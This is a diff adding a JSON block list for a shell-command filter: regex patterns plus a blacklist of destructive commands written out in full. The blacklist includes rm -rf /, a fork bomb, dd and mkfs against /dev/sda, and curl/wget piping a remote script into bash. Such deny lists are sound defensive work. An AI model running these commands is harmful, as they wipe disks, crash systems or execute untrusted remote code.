@@ -1,0 +1,43 @@
+{
+  "patterns": [
+    "\\brm\\s+-[rf]+\\b",
+    "\\bsudo\\b",
+    "\\bkillall\\b",
+    "\\bshutdown\\b",
+    "\\breboot\\b",
+    "\\bhalt\\b",
+    "\\bdd\\b",
+    "\\bmkfs\\b",
+    "\\bfdisk\\b",
+    "\\bpasswd\\b",
+    "\\bchmod\\s+777\\b",
+    "\\buninstall\\b",
+    ">/etc/",
+    ">/usr/",
+    ">/bin/",
+    ">/sbin/",
+    "\\bchown\\b",
+    "\\bidel\\b",
+    "\\bformat\\b",
+    "\\bln\\s+-s\\b",
+    "\\bmv\\s+/\\b"
+  ],
+  "blacklisted": [
+    "rm -rf /",
+    "rm -rf /*",
+    "rm -rf ~",
+    "rm -rf ~/*",
+    ":(){ :|:& };:",
+    "> /dev/sda",
+    "dd if=/dev/zero of=/dev/sda",
+    "mkfs.ext4 /dev/sda",
+    "chmod -R 777 /",
+    "chmod -R 777 /*",
+    "wget -O- http://example.com/script.sh | bash",
+    "curl -s http://example.com/script.sh | bash",
+    "launchctl unload /System/Library/LaunchDaemons/",
+    "rm /private/var/db/.AppleSetupDone",
+    "osascript -e 'tell application \"System Events\" to restart'",
+    "while [ 1 ]; do fork; done"
+  ]
+}
